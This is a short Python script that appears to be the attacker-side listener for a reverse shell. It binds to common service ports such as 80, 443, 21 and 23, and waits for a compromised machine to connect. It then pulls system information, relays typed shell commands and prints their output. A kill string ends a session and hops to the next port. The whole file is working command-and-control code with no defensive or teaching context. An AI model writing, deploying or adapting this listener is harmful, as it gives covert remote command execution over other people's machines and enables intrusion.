import socket
import time

HOST = "0.0.0.0"  # all local IPs
ports = [80, 8080, 443, 20, 21, 23]
PORT = ports[0]
BUFFER = 1024

KILLSTRING = "endme"
INFO_QUERY = "informationquery"

PROMPT = "$ "

def nextPort(p):
	global ports
	i = ports.index(p)
	if i == 5:
		return ports[0]
	return ports[i+1]


open_conn = False
while True:
	try:
		if not open_conn:
			s = socket.socket()
			s.bind((HOST, PORT))
			print("Ready for connections on " + str(PORT))
			s.listen(1)
			conn, raddr = s.accept()
			open_conn = True
			print("Getting system information...")
			time.sleep(1)
			conn.send(INFO_QUERY.encode())
			PROMPT = conn.recv(BUFFER).decode()
			print("Prompt set: " + PROMPT)

		cmd = input(PROMPT)
		conn.send(cmd.encode())
		
		if cmd == KILLSTRING:
			print("Ending")
			conn.shutdown(1)
			conn.close()
			open_conn = False
			s.close()
			PORT = nextPort(PORT)
		else:
			rsp = conn.recv(BUFFER).decode()
			if INFO_QUERY == rsp[0:len(INFO_QUERY)]:
				PROMPT = rsp[len(INFO_QUERY)::]
			else:
				print(rsp)
	except Exception as e:
		print(e)
		time.sleep(1)
